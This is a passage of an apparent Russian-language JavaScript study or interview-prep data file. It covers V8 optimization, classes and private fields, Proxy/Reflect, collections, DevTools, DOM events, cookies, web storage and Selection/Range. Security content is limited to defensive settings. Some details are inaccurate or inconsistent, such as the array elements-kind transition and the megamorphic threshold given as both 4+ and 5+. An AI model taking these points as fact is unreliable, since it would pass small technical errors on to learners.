AST передаётся в Ignition — интерпретатор V8. Он генерирует байткод — промежуточное низкоуровневое представление, но не машинный код. Байткод генерируется быстро и выполняется сразу — это даёт быстрый старт. Пользователь видит страницу не дожидаясь тяжёлой компиляции. Параллельно Ignition собирает профилирующую информацию: какие функции вызываются часто, какие типы аргументов приходят, какие ветки if/else выполняются.

**4. TurboFan (оптимизирующий компилятор) → машинный код:**
Когда функция вызывается достаточно часто (становится «горячей»), Ignition передаёт её байткод и собранный профиль в TurboFan. TurboFan выполняет спекулятивную оптимизацию — на основе профиля предполагает типы и генерирует оптимизированный машинный код. Например, если add(a, b) 10000 раз получала числа — TurboFan генерирует машинный код для сложения чисел напрямую, без проверок типов, без boxing, с использованием CPU-инструкций для целочисленной арифметики.

**5. Деоптимизация (Deoptimization):**
Если предположения TurboFan оказались неверны (пришла строка вместо числа, объект другой формы) — оптимизированный машинный код выбрасывается, и функция возвращается к выполнению через байткод в Ignition. Это называется bailout. Функция снова работает медленно, но корректно. Ignition продолжит собирать профиль, и если увидит новую стабильную закономерность — TurboFan попробует оптимизировать заново, уже с учётом новых типов.
Практические следствия:

Мономорфный код (одни типы) → TurboFan оптимизирует → быстро
Полиморфный код (разные типы в одном месте) → частые деоптимизации → медленно
Большие бандлы → lazy parsing экономит время старта → code splitting помогает
eval(), with, arguments в некоторых случаях отключают оптимизации TurboFan

**Основные причины деоптимизации**

**1. Смена типа аргумента функции:**
\`\`\`js
function add(a, b) { return a + b; }

add(1, 2);       // TurboFan: "всегда числа" → оптимизирует
add(1, 2);       // × 10000 раз
add('x', 'y');   // ❌ строки! → bailout, сброс в байткод
\`\`\`

**2. Добавление свойств после создания объекта — ломает Hidden Class:**
\`\`\`js
function Point(x, y) { this.x = x; this.y = y; }
const p = new Point(1, 2);
p.z = 3; // ❌ новая форма объекта → новый Hidden Class → деоптимизация
\`\`\`
Все свойства объявляй в конструкторе и в одном порядке.

**3. delete — переводит объект в dictionary mode:**
\`\`\`js
const obj = { x: 1, y: 2 };
delete obj.x; // ❌ V8 теряет Hidden Class → slow mode (hashmap)
obj.x = null; // ✅ лучше — структура не меняется
\`\`\`

**4. Смешение типов в массиве:**
\`\`\`js
const arr = [1, 2, 3];     // SMI_ELEMENTS (целые числа) — быстро
arr.push(1.5);             // → DOUBLE_ELEMENTS (переход)
arr.push('hello');         // → HOLEY_ELEMENTS (переход, медленнее)
// Каждый переход — деоптимизация кода который работал с этим массивом
\`\`\`

**5. arguments и eval отключают оптимизации:**
\`\`\`js
function bad() {
  return eval(arguments[0]); // TurboFan не может предсказать что здесь
}
// Функция никогда не будет оптимизирована TurboFan
\`\`\`

**6. Object.setPrototypeOf — немедленная деоптимизация:**
\`\`\`js
const obj = { x: 1 };
Object.setPrototypeOf(obj, proto); // ❌ сброс Hidden Class
\`\`\`

**7. Мегаморфный вызов функции (4+ разных формы объекта):**
\`\`\`js
function getX(obj) { return obj.x; }

getX({ x: 1 });           // форма 1
getX({ x: 1, y: 2 });    // форма 2
getX({ x: 1, y: 2, z: 3 }); // форма 3
getX({ a: 0, x: 1 });    // форма 4 → мегаморфный IC, TurboFan сдаётся
\`\`\`
Inline Cache переходит в мегаморфное состояние — кэш больше не работает, каждый вызов — lookup.`,score:3},{name:"Преобразование классов в рантайме. Приватные и статичные поля",level:"4",content:`**Класс — синтаксический сахар над функцией**

\`typeof class\` === \`'function'\`. Движок преобразует объявление класса в обычную функцию-конструктор + объект \`prototype\`:

\`\`\`js
class User {
  constructor(name) { this.name = name; }
  greet() { return 'Hi, ' + this.name; }
  static create(name) { return new User(name); }
}

// Примерный эквивалент после преобразования:
function User(name) { this.name = name; }
User.prototype.greet = function() { return 'Hi, ' + this.name; };
User.create = function(name) { return new User(name); };

// Non-enumerable — методы не видны в for..in
Object.getOwnPropertyDescriptor(User.prototype, 'greet').enumerable; // false
\`\`\`

**Куда попадает каждый вид объявления:**

\`\`\`js
class Foo {
  instanceField = 42;        // → в constructor, this.instanceField = 42
  method() {}                // → Foo.prototype.method
  static staticMethod() {}   // → Foo.staticMethod (на самой функции)
  static staticField = 'x';  // → Foo.staticField (после создания класса)
}
\`\`\`

**Поля экземпляра (public fields)** инициализируются в конструкторе до его тела:
\`\`\`js
class Counter {
  count = 0;           // выполняется первым
  constructor() {
    console.log(this.count); // 0 — поле уже есть
  }
}
// Их НЕТ на prototype — только на экземпляре
'count' in Counter.prototype; // false
'count' in new Counter();     // true
\`\`\`

**Цепочка прототипов для наследования:**
\`\`\`js
class Animal { speak() {} }
class Dog extends Animal { bark() {} }

Object.getPrototypeOf(Dog) === Animal;                 // true (статика)
Object.getPrototypeOf(Dog.prototype) === Animal.prototype; // true (методы)
\`\`\`
Движок создаёт две цепочки: по функциям (статика) и по \`prototype\` (методы экземпляров).

**Приватные поля (#) — под капотом**

Реализованы через внутренний слот, аналогичный \`WeakMap<instance, value>\`:
\`\`\`js
class User {
  #password = '123';

  checkPassword(p) { return this.#password === p; }

  // Проверить принадлежность — оператор in
  static isUser(obj) { return #password in obj; }
}

const u = new User();
u.#password;            // SyntaxError — проверяется статически
u['#password'];         // undefined — это не то же самое
User.isUser(u);         // true
User.isUser({});        // false
\`\`\`

Приватность гарантирована движком — не обойти через \`Proxy\`, \`Object.keys\`, JSON.stringify.

**Приватные методы и статические приватные поля:**
\`\`\`js
class Logger {
  static #instance = null;      // приватное статическое поле

  #log(msg) {                   // приватный метод (на prototype, но недоступен снаружи)
    console.log('[LOG]', msg);
  }

  static getInstance() {
    if (!Logger.#instance) Logger.#instance = new Logger();
    return Logger.#instance;
  }

  write(msg) { this.#log(msg); }
}
\`\`\`

**3 способа приватности — сравнение:**

| Способ | Настоящая | Производительность | Синтаксис |
|---|---|---|---|
| \`_name\` | Нет (соглашение) | Нативная | Простой |
| \`WeakMap\` | Да | Небольшой оверхед | Громоздкий |
| \`#name\` | Да | Нативная | Встроен в язык |

**Статические блоки инициализации (ES2022):**
\`\`\`js
class Config {
  static debug;
  static timeout;

  static {
    // Любой код — try/catch, условия, вычисления
    const env = getEnv();
    Config.debug = env === 'dev';
    Config.timeout = Config.debug ? 5000 : 1000;
  }
}
\`\`\``,score:3},{name:"Оптимизации в V8: Скрытые классы, Inline Caching",level:"4",content:`**Скрытые классы (Hidden Classes)**

**Hashmap** — структура данных "ключ → значение". При чтении \`obj.name\` нужно вычислить хэш строки "name", найти ячейку, разрешить коллизии. Это O(1) в среднем, но с константными накладными расходами на каждое обращение.

V8 не хранит свойства объекта как hashmap — это медленно. Вместо этого он назначает каждому объекту Hidden Class (внутреннее описание формы) — какие свойства есть и по какому смещению в памяти. Тогда \`obj.name\` читается напрямую по смещению — как поле структуры в C, без хэширования.

\`\`\`js
const user = {};        // Hidden Class C0: {}
user.name = 'Alice';    // → C1: { name: offset 0 }
user.age = 25;          // → C2: { name: offset 0, age: offset 8 }
\`\`\`

Два объекта с **одинаковым порядком добавления свойств** разделяют один Hidden Class → V8 переиспользует оптимизации для обоих.

\`\`\`js
// ✅ Оба получат один Hidden Class C2
const a = {}; a.x = 1; a.y = 2;
const b = {}; b.x = 5; b.y = 10;

// ❌ Разные Hidden Classes — разный порядок свойств
const c = {}; c.x = 1; c.y = 2;
const d = {}; d.y = 2; d.x = 1;
\`\`\`

**Практика:** инициализировать все свойства в конструкторе в одинаковом порядке. Динамическое добавление свойств в разном порядке дробит оптимизации.

**delete — опасен:**
Удаление свойства переводит объект в **dictionary mode** (slow mode) — V8 переходит на настоящий hashmap, теряет скрытый класс. Вместо delete → присвой \`undefined\` или \`null\`.

---

**Inline Caching (IC)**

IC — оптимизация на уровне JIT. Каждый раз когда V8 впервые выполняет операцию вроде \`obj.prop\`, он не знает что там внутри — и делает полный поиск. Но он запоминает: "здесь был объект с Hidden Class C2, свойство prop — на смещении 8". При следующем вызове просто проверяет класс и читает по смещению — без хэширования, без поиска.

Проблема возникает когда в одно и то же место кода приходят объекты **разных форм**. V8 должен хранить кэш для каждой встреченной формы — и с каждой новой формой кэш становится дороже:

\`\`\`js
function getX(obj) { return obj.x; }

getX({ x: 1 });           // 1-я форма → IC: Uninitialized → Monomorphic
getX({ x: 2, y: 3 });     // 2-я форма → IC: Monomorphic → Polymorphic
getX({ a: 1, x: 4 });     // 3-я форма → IC: Polymorphic (растёт)
// ... 5+ форм → Megamorphic: кэш выброшен, каждый вызов — полный поиск
\`\`\`

Стадии — это не настройки, а **состояние кэша**. V8 сам переводит IC вперёд по мере того как видит новые формы:

- **Uninitialized** — функция ещё не вызывалась
- **Monomorphic** — одна форма → максимально быстро, кэш из одной записи
- **Polymorphic** — 2–4 формы → кэш на несколько вариантов, сравниваются линейно
- **Megamorphic** — 5+ форм → кэш выброшен, V8 ходит в глобальную хэш-таблицу

**Назад IC не откатывается.** Функция ставшая Megamorphic остаётся такой до следующей перекомпиляции — V8 переключается обратно на hashmap (полный поиск по хэшу при каждом обращении), теряя все преимущества скрытых классов. Поэтому утилитарные функции которые принимают любые объекты (lodash, Object.assign) сознательно написаны так чтобы не полагаться на IC.`,score:3.5},{name:"Proxy и Reflect",level:"4",content:`**Proxy** — обёртка вокруг объекта, которая перехватывает операции над ним. Сам объект не меняется — ты работаешь с прокси, а прокси решает что делать дальше.

\`\`\`js
const handler = {
  get(target, prop, receiver) {
    console.log(\`читаем \${prop}\`);
    return Reflect.get(target, prop, receiver); // стандартное поведение
  },
  set(target, prop, value, receiver) {
    if (typeof value !== 'number') throw new TypeError('только числа');
    return Reflect.set(target, prop, value, receiver);
  },
};

const proxy = new Proxy({}, handler);
proxy.x = 42;   // OK
proxy.x = 'hi'; // TypeError
\`\`\`

**Полный список ловушек** (каждая перехватывает свою операцию):
\`\`\`js
get(target, prop, receiver)              // obj.prop
set(target, prop, value, receiver)       // obj.prop = value
has(target, prop)                        // 'prop' in obj
deleteProperty(target, prop)             // delete obj.prop
apply(target, thisArg, args)             // fn()
construct(target, args)                  // new Fn()
ownKeys(target)                          // Object.keys(), for...in
defineProperty(target, key, desc)        // Object.defineProperty
getOwnPropertyDescriptor(target, key)    // Object.getOwnPropertyDescriptor
getPrototypeOf(target)                   // Object.getPrototypeOf
setPrototypeOf(target, proto)            // Object.setPrototypeOf
isExtensible(target)                     // Object.isExtensible
preventExtensions(target)                // Object.preventExtensions
\`\`\`

---

**Reflect** — зеркало операций JS. Для каждой ловушки Proxy есть соответствующий метод Reflect с той же сигнатурой.

Зачем не просто \`target[prop]\`:
\`\`\`js
// ❌ Без Reflect — теряем receiver, this в геттере будет target, а не proxy
get(target, prop) {
  return target[prop]; // если prop — геттер, this внутри = target
}

// ✅ С Reflect — receiver (прокси) правильно передаётся как this
get(target, prop, receiver) {
  return Reflect.get(target, prop, receiver);
}
\`\`\`
Это критично когда объект наследует геттеры — без receiver они сломаются.

---

**Инварианты Proxy:**
Proxy не может нарушать объектную модель JS. Если свойство \`non-configurable + non-writable\`, get-ловушка обязана вернуть то же значение что в target — иначе TypeError. Движок принудительно проверяет это независимо от твоего кода.

**Proxy.revocable():**
\`\`\`js
const { proxy, revoke } = Proxy.revocable(target, handler);
revoke(); // proxy мёртв → TypeError на любую операцию
\`\`\`
Кейс: временный доступ к объекту. После revoke все ссылки на proxy бесполезны — данные не утекут.

**Где используется:** Vue 3 реактивность (перехват get/set для отслеживания зависимостей), MobX, валидация данных, логирование, мемоизация.`,score:3},{name:"Map, Set, WeakMap, WeakSet",level:"3",content:`**Map** — коллекция ключ-значение. Ключом может быть что угодно (объект, функция, NaN):
\`\`\`js
const map = new Map();
map.set('key', 'value');
map.set(obj, 42);        // объект как ключ
map.get('key');          // 'value'
map.has('key');          // true
map.delete('key');
map.size;                // кол-во записей

// Итерация:
for (const [key, value] of map) { ... }
map.forEach((value, key) => { ... });
[...map.keys()], [...map.values()], [...map.entries()]
\`\`\`
Map vs Object: Map сохраняет порядок вставки, не имеет прототипных ключей, удобнее для итерации.

**Set** — коллекция уникальных значений:
\`\`\`js
const set = new Set([1, 2, 2, 3]); // Set {1, 2, 3}
set.add(4);
set.has(2);   // true
set.delete(2);
set.size;     // 3

// Удаление дублей из массива:
const unique = [...new Set(arr)];
\`\`\`

**WeakMap** — как Map, но:
• Ключи — только объекты
• Слабые ссылки — если объект-ключ больше нигде не используется, GC его удалит вместе с записью
• Нет итерации, нет size
\`\`\`js
const cache = new WeakMap();
cache.set(domNode, computedData); // удалится вместе с domNode
\`\`\`
Кейсы: кэш данных привязанный к объекту, приватные данные классов без утечек памяти.

**WeakSet** — как Set, но только объекты, слабые ссылки, нет итерации:
\`\`\`js
const seen = new WeakSet();
seen.add(obj);
seen.has(obj); // true
\`\`\`
Кейс: отмечать объекты как "обработанные" без удержания в памяти.

**Ключевое отличие Weak-версий:** не мешают сборщику мусора — объект удалится как только исчезнут все остальные ссылки на него.`,score:3.5}]},{id:"browser",title:"БРАУЗЕР И ЕГО ИНСТРУМЕНТЫ",icon:"🌐",color:"#4FC3F7",topics:[{name:"devTools (network, application)",level:"2",content:`**Network:** мониторинг HTTP-запросов, время загрузки, размеры, заголовки, тело ответа. Фильтрация по типу (XHR, JS, CSS, Img). Throttling (3G, offline).

**Application:** cookies, localStorage, sessionStorage, IndexedDB, Service Workers, Cache Storage, Manifests.

**Performance:** запись и анализ производительности, flame chart, CPU profiling.

**Elements:** DOM-дерево, стили, computed styles, box model.

**Console:** логирование, выполнение JS, фильтрация по уровням.

**Memory:** heap snapshots (сравнивать до/после — найти утечки), allocation timeline (что создаётся и удерживается), retained size — реальная память с учётом удерживаемых объектов.

**Coverage:** показывает % неиспользуемого JS/CSS при загрузке страницы. Помогает найти что вынести в lazy-load.

**Local Overrides:** редактировать файлы сайта прямо в DevTools — изменения переживают перезагрузку страницы. Удобно для экспериментов без локального сервера.

**Recorder:** запись пользовательских сценариев → воспроизведение → экспорт в Playwright/Puppeteer скрипты.`},{name:"breakpoints",level:"2",content:`**Типы breakpoints в DevTools:**

• **Line breakpoint** — пауза на конкретной строке кода
• **Conditional breakpoint** — срабатывает при условии (\`user.id === 5\`)
• **DOM breakpoint** — при изменении DOM-узла (subtree, attributes, node removal)
• **XHR/Fetch breakpoint** — при запросе к определённому URL
• **Event listener breakpoint** — при определённом событии (click, scroll)
• **Exception breakpoint** — при выбросе исключения

**Отладка:** Step over (F10), Step into (F11), Step out (Shift+F11), Resume (F8).

**Watch expressions** — отслеживание переменных. **Call Stack** — стек вызовов. **Scope** — текущие переменные.`},{name:"Всплытие и погружение событий",level:"2",content:`**3 фазы события:**
1. **Capturing (погружение)** — от window вниз к целевому элементу
2. **Target** — событие на целевом элементе
3. **Bubbling (всплытие)** — от целевого элемента вверх к window

\`\`\`js
el.addEventListener('click', handler, true);  // capturing
el.addEventListener('click', handler, false); // bubbling (по умолчанию)
\`\`\`

**event.stopPropagation()** — останавливает всплытие/погружение
**event.stopImmediatePropagation()** — + отменяет остальные обработчики на этом элементе
**event.preventDefault()** — отменяет действие по умолчанию (НЕ останавливает всплытие)

**Делегирование событий:** вешаем один обработчик на родителя, проверяем \`event.target\`.`},{name:"Основные браузерные события",level:"2",content:`**Мышь:**
\`\`\`
click       — клик (mousedown + mouseup на одном элементе)
dblclick    — двойной клик
mousedown   — кнопка нажата
mouseup     — кнопка отпущена
mousemove   — движение мыши
mouseenter  — вошла на элемент (не всплывает, не триггерится на детях)
mouseleave  — вышла с элемента (не всплывает)
mouseover   — вошла на элемент или дочерний (всплывает)
mouseout    — вышла с элемента или дочернего (всплывает)
contextmenu — правый клик
wheel       — колесо мыши
\`\`\`
mouseenter/mouseleave — для одного элемента, не реагируют на детей. mouseover/mouseout — всплывают, срабатывают при переходе между дочерними.

**Клавиатура:**
\`\`\`
keydown   — клавиша нажата (повторяется при удержании)
keyup     — клавиша отпущена
keypress  — устарел, не использовать
\`\`\`

**Форма:**
\`\`\`
submit    — отправка формы
reset     — сброс формы
change    — значение изменено И потерян фокус (input, select, checkbox)
input     — значение изменяется в реальном времени (каждый символ)
focus     — элемент получил фокус (не всплывает)
blur      — элемент потерял фокус (не всплывает)
focusin   — как focus, но всплывает
focusout  — как blur, но всплывает
\`\`\`

**Документ и окно:**
\`\`\`
DOMContentLoaded — DOM построен, стили/картинки могут не загрузиться
load             — всё загружено (стили, картинки, шрифты)
beforeunload     — перед закрытием (можно показать предупреждение)
unload           — страница закрывается
resize           — изменение размера окна
scroll           — прокрутка
visibilitychange — вкладка стала активной/неактивной
\`\`\`

**Drag & Drop:**
\`\`\`
dragstart  — начало перетаскивания
drag       — во время перетаскивания
dragend    — конец перетаскивания
dragenter  — элемент вошёл в зону drop
dragleave  — элемент вышел из зоны drop
dragover   — над зоной drop (нужен preventDefault() чтобы drop сработал)
drop       — элемент брошен
\`\`\`

**Touch (мобильные):**
\`\`\`
touchstart  — палец коснулся экрана
touchmove   — палец движется
touchend    — палец убран
touchcancel — касание прервано (звонок, уведомление)
\`\`\`

**Буфер обмена:**
\`\`\`
copy   — копирование
cut    — вырезание
paste  — вставка
\`\`\`

**Медиа:**
\`\`\`
play          — воспроизведение началось
pause         — пауза
ended         — воспроизведение закончено
timeupdate    — текущее время изменилось
volumechange  — громкость изменилась
loadeddata    — данные загружены
\`\`\`

**Анимации и переходы:**
\`\`\`
animationstart  — CSS-анимация началась
animationend    — CSS-анимация закончилась
transitionend   — CSS-transition закончился
\`\`\`

**Intersection Observer** — не событие, но ключевой API. Срабатывает когда элемент появляется или исчезает из viewport. Используется для lazy-loading, infinite scroll, анимаций при скролле:
\`\`\`js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      loadImage(entry.target);
      observer.unobserve(entry.target); // перестать следить
    }
  });
}, { threshold: 0.1 }); // 0.1 = срабатывает когда 10% элемента видно

observer.observe(document.querySelector('.lazy-img'));
\`\`\`

**Passive listeners** — подсказка браузеру что обработчик не вызовет preventDefault(). Браузер не ждёт выполнения обработчика перед прокруткой — скролл плавнее:
\`\`\`js
document.addEventListener('scroll', handler, { passive: true });
document.addEventListener('touchmove', handler, { passive: true });
\`\`\``},{name:"Что такое DOM. JS Методы работы с узлами",level:"2",content:`**DOM (Document Object Model)** — древовидное представление HTML-документа. Каждый HTML-тег — узел (node).

**Поиск:**
\`\`\`js
document.getElementById('id')
document.querySelector('.class')      // первый
document.querySelectorAll('.class')   // все (статическая коллекция)
document.getElementsByClassName()     // живая коллекция
\`\`\`

**Создание/модификация:**
\`\`\`js
document.createElement('div')
element.append(child)      // в конец
element.prepend(child)     // в начало
element.before(sibling)    // перед
element.after(sibling)     // после
element.remove()           // удалить
element.cloneNode(true)    // глубокое клонирование
\`\`\`

**Атрибуты:** getAttribute, setAttribute, removeAttribute, dataset (data-*).
**Классы:** classList.add, remove, toggle, contains.

**DocumentFragment** — лёгкий узел вне DOM. Добавляй элементы пакетно, потом вставь один раз → один reflow:
\`\`\`js
const frag = document.createDocumentFragment();
items.forEach(item => {
  const li = document.createElement('li');
  li.textContent = item;
  frag.appendChild(li);
});
list.appendChild(frag); // единственный reflow
\`\`\`

**MutationObserver** — следит за изменениями в DOM (замена устаревшего MutationEvents):
\`\`\`js
const observer = new MutationObserver((mutations) => {
  mutations.forEach(m => console.log(m.type, m.addedNodes, m.attributeName));
});
observer.observe(element, {
  childList: true,    // добавление/удаление дочерних узлов
  subtree: true,      // всё поддерево
  attributes: true,   // изменения атрибутов
  characterData: true // изменения текстового контента
});
observer.disconnect();
\`\`\`
Используется в: React DevTools, rich text редакторах, analytics трекерах.`},{name:"iframe",level:"3",content:`**iframe** — встраивает другую HTML-страницу внутрь текущей.

\`\`\`html
<iframe src="https://example.com" sandbox="allow-scripts"></iframe>
\`\`\`

**Безопасность:**
• **sandbox** — ограничивает возможности: allow-scripts, allow-same-origin, allow-forms, allow-popups
• **Same-Origin Policy** — доступ к содержимому iframe только с того же домена
• **postMessage** — безопасное общение между окнами разных доменов

\`\`\`js
// Родитель → iframe
iframe.contentWindow.postMessage(data, 'https://target.com');

// iframe → родитель
window.parent.postMessage(data, 'https://parent.com');

// Приём
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://trusted.com') return;
  console.log(e.data);
});
\`\`\`

**X-Frame-Options** — заголовок, запрещающий встраивание сайта в iframe.`},{name:"Отладка WebSocket в браузере",level:"3",content:`В DevTools → Network → вкладка **WS** (WebSocket):
• Видны все WebSocket-соединения
• **Messages** — отправленные (зелёные) и полученные (красные) сообщения
• **Headers** — заголовки handshake (Upgrade: websocket)
• **Timing** — время установки соединения

Можно фильтровать по содержимому сообщений, видеть бинарные данные. Полезно для дебага real-time приложений (чаты, уведомления, торговые платформы).`},{name:"Базовое понимание cookies",level:"3",content:`**Cookie** — небольшой фрагмент данных (до ~4 KB), который сервер устанавливает в браузере через заголовок Set-Cookie. Браузер автоматически прикладывает cookie к каждому HTTP-запросу к тому же домену через заголовок Cookie.

Именно поэтому cookies используют для аутентификации — сервер один раз установил session-id, и браузер сам носит его при каждом запросе, не требуя ничего от JS-кода.

**Как это выглядит на уровне HTTP:**
\`\`\`
← Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
→ Cookie: session=abc123
\`\`\`

**Установка через JS:**
\`\`\`js
// Записать
document.cookie = "theme=dark; max-age=2592000; path=/";

// Прочитать — возвращает ВСЕ cookie строкой через ";"
document.cookie; // "theme=dark; lang=ru"

// Удалить — установить max-age=0 или expires в прошлом
document.cookie = "theme=; max-age=0; path=/";
\`\`\`
API намеренно неудобный — нет нативного getItem/removeItem. Обычно используют библиотеку js-cookie или пишут хелпер.

**Атрибуты безопасности:**

**HttpOnly** — cookie недоступна из JS (document.cookie её не видит). Защита от XSS.

**Secure** — cookie отправляется только по HTTPS.

**SameSite** — контролирует отправку cookie в кросс-сайтовых запросах:
\`\`\`
Strict — не отправляется ни в каких кросс-сайтовых запросах
Lax    — не отправляется при CSRF-запросах (POST, img, iframe),
         но отправляется при top-level навигации. Дефолт в современных браузерах.
None   — отправляется всегда, требует Secure. Для third-party (виджеты, аналитика).
\`\`\`

**path и domain:**
\`\`\`
path=/admin   — cookie видна только для /admin и его подпутей
domain=.example.com — cookie доступна для всех поддоменов (sub.example.com, api.example.com)
\`\`\`
Без явного domain — cookie принадлежит только точному домену, поддомены не видят.

**max-age vs expires:**
\`\`\`js
max-age=3600       // секунды от текущего момента (предпочтительнее)
expires=Wed, 21 Oct 2026 07:28:00 GMT  // конкретная дата (зависит от часов клиента)
\`\`\`
Без обоих — session cookie: живёт до закрытия браузера (не вкладки).

**Типы cookies:**
\`\`\`
Session cookie    — без max-age/expires, удаляется при закрытии браузера
Persistent cookie — с max-age/expires, хранится до истечения срока
First-party       — домен совпадает с текущим сайтом
Third-party       — домен отличается (пиксели аналитики, рекламные трекеры)
                    Браузеры блокируют по умолчанию (Safari ITP, Chrome Privacy Sandbox)
\`\`\`

**Ограничения:**
• ~4 KB на одну cookie
• ~50 cookies на домен (в зависимости от браузера)
• Отправляются с каждым запросом — не хранить большие данные (для этого localStorage)

**Cookie vs localStorage:**
\`\`\`
Cookie         — автоматически летит на сервер, есть HttpOnly/Secure, 4 KB
localStorage   — только JS, не уходит на сервер, нет HttpOnly, 5-10 MB
\`\`\`
Для аутентификации — cookie с HttpOnly. Для настроек UI — localStorage.`},{name:"localStorage и sessionStorage",level:"3",content:`**localStorage** — хранит данные без срока истечения, переживает закрытие браузера. Область видимости: домен + протокол (http и https — разные хранилища).

**sessionStorage** — данные живут до закрытия вкладки. Уникально для каждой вкладки: две вкладки одного сайта — два разных sessionStorage. Дублируется при открытии вкладки через Ctrl+Click (копируется на момент открытия, дальше независимо).

**API — синхронный (одинаковый для обоих):**
\`\`\`js
localStorage.setItem('key', JSON.stringify(value));
const val = JSON.parse(localStorage.getItem('key')); // null если нет
localStorage.removeItem('key');
localStorage.clear();
localStorage.length;
localStorage.key(0); // ключ по индексу

// sessionStorage — тот же интерфейс, другая область видимости
sessionStorage.setItem('step', '2');
sessionStorage.getItem('step'); // '2'
\`\`\`

**Нюансы:**
• Хранит только строки — объекты нужно JSON.stringify/parse
• getItem несуществующего ключа возвращает null, не undefined
• Синхронный API — блокирует main thread при большом объёме данных
• ~5 MB на домен (зависит от браузера, в некоторых 10 MB)
• Недоступен в Web Workers и Service Workers (там — IndexedDB)
• В режиме инкогнито очищается при закрытии окна (ведёт себя как sessionStorage)

**Событие storage:**
\`\`\`js
window.addEventListener('storage', (e) => {
  e.key;        // изменённый ключ (null при clear())
  e.oldValue;
  e.newValue;
  e.url;        // страница, которая изменила
  e.storageArea // localStorage или sessionStorage
});
\`\`\`
Срабатывает только в других вкладках/окнах того же домена — не в той, что изменила. Используется для синхронизации состояния между вкладками.

**localStorage vs sessionStorage vs cookie:**
\`\`\`
                localStorage  sessionStorage  cookie
Срок жизни      бессрочно     до закрытия вк. задаётся явно
Объём           ~5 MB         ~5 MB           ~4 KB
Уходит на сервер нет          нет             да (каждый запрос)
Доступ из JS    да            да              да (если нет HttpOnly)
Вкладки         общий         изолирован      общий
\`\`\``},{name:"Базовое понимание Selection и Range",level:"3",content:`**Range** — объект, описывающий фрагмент DOM от стартовой до конечной точки. Точка = (node, offset), где offset для текстового узла — позиция символа, для элемента — индекс дочернего узла.

\`\`\`js
const range = document.createRange();

range.setStart(textNode, 2);       // с 3-го символа текстового узла
range.setEnd(textNode, 7);         // по 7-й
range.selectNode(el);              // весь элемент включая тег
range.selectNodeContents(el);      // только содержимое элемента
range.collapse(true);              // схлопнуть в начало (false — в конец)

range.toString();                  // текст внутри
range.getBoundingClientRect();     // координаты для позиционирования тултипа
range.cloneContents();             // DocumentFragment — копия без удаления
range.extractContents();           // DocumentFragment — вырезает из DOM
range.deleteContents();            // удаляет содержимое
range.insertNode(node);            // вставить узел в начало range
range.surroundContents(node);      // обернуть содержимое в node
\`\`\`

**Selection** — то что выделил пользователь; может содержать несколько Range (на практике браузеры поддерживают один).

\`\`\`js
const sel = window.getSelection();

sel.rangeCount;           // количество Range (обычно 0 или 1)
sel.getRangeAt(0);        // получить Range по индексу
sel.toString();           // выделенный текст
sel.isCollapsed;          // true если курсор без выделения (каретка)
sel.anchorNode;           // узел где началось выделение
sel.anchorOffset;         // смещение в anchorNode
sel.focusNode;            // узел где закончилось выделение
sel.focusOffset;

sel.removeAllRanges();    // снять выделение
sel.addRange(range);      // программно выделить
sel.collapse(node, offset); // переместить каретку
sel.selectAllChildren(el);  // выделить всё содержимое элемента
\`\`\`

**anchor vs focus:** anchor — где пользователь нажал мышь, focus — где отпустил. При выделении снизу вверх focus будет раньше anchor в DOM.

**Типичные задачи:**
\`\`\`js
// Получить координаты выделения (для тултипа форматирования)
const rect = sel.getRangeAt(0).getBoundingClientRect();

// Программно выделить текст в элементе
const range = document.createRange();
range.selectNodeContents(document.getElementById('title'));
sel.removeAllRanges();
sel.addRange(range);

// Вставить HTML в позицию курсора (contenteditable)
const range = sel.getRangeAt(0);
range.deleteContents();
range.insertNode(document.createTextNode('вставленный текст'));
\`\`\`

**Применение:** rich-text редакторы (Slate, TipTap), подсветка найденного текста, кастомные контекстные меню по выделению, аннотации.`},{name:"Особенности работы с браузерными событиями",level:"3",content:`**Throttle** — не чаще чем раз в N мс (scroll, resize).
**Debounce** — ждёт N мс после последнего вызова (input поиска).

**Опции addEventListener:**

**once** — обработчик срабатывает один раз и автоматически удаляется:
\`\`\`js
button.addEventListener('click', handler, { once: true });
\`\`\`

**passive** — обещаем браузеру что не вызовем preventDefault(). Браузер не ждёт выполнения обработчика перед прокруткой → плавный скролл:
\`\`\`js
document.addEventListener('scroll', handler, { passive: true });
document.addEventListener('touchmove', handler, { passive: true });
\`\`\`
Важно для scroll/touchmove — без passive браузер каждый раз ждёт, не вызван ли preventDefault(), и тормозит прокрутку.

**capture** — обработчик на фазе погружения (по умолчанию false — всплытие):
\`\`\`js
el.addEventListener('click', handler, { capture: true });
// или сокращённо:
el.addEventListener('click', handler, true);
\`\`\`

**Удаление обработчика — нужна та же ссылка на функцию:**
\`\`\`js
// ❌ Не работает — каждый раз новая функция:
el.addEventListener('click', () => handler());
el.removeEventListener('click', () => handler());

// ✅ Работает — одна ссылка:
const fn = () => handler();
el.addEventListener('click', fn);
el.removeEventListener('click', fn);
\`\`\`
Та же проблема с методами класса — this.handler каждый раз одна ссылка, а () => this.handler() — нет.

**Делегирование событий** — один обработчик на родителе вместо N обработчиков на детях. Работает благодаря всплытию:
\`\`\`js
// Плохо — 1000 обработчиков:
items.forEach(item => item.addEventListener('click', handler));

// Хорошо — один обработчик:
list.addEventListener('click', (e) => {
  const item = e.target.closest('.item');
  if (!item || !list.contains(item)) return; // защита от кликов вне .item
  handler(item);
});
\`\`\`
closest() поднимается по DOM вверх — работает даже если кликнули на дочерний элемент внутри .item. contains() защищает от случая когда closest нашёл элемент за пределами контейнера.

**Custom Events:**
\`\`\`js
const event = new CustomEvent('myEvent', { detail: { id: 1 }, bubbles: true });
element.dispatchEvent(event);
\`\`\``},{name:"Живые коллекции, методы обработки и преобразования в массив",level:"3",content:`**Живая коллекция** — автоматически обновляется при изменении DOM:
\`\`\`js
const divs = document.getElementsByTagName('div'); // живая
// Добавили div → divs.length увеличится
\`\`\`

**Статическая коллекция** — снимок на момент вызова:
\`\`\`js
const divs = document.querySelectorAll('div'); // статическая
// Добавили div → divs.length НЕ изменится
\`\`\`

**Преобразование в массив:**
\`\`\`js
Array.from(collection)
[...collection]
Array.prototype.slice.call(collection)
\`\`\`

Живые: getElementsByClassName, getElementsByTagName, children
Статические: querySelectorAll`},{name:"Service workers",level:"4",content:`**Service Worker** — JS скрипт который:
• Работает в отдельном потоке (не блокирует UI)
• Является прокси между браузером и сетью
• Живёт дольше страницы — продолжает работать когда вкладка закрыта
• Работает только на HTTPS (или localhost)
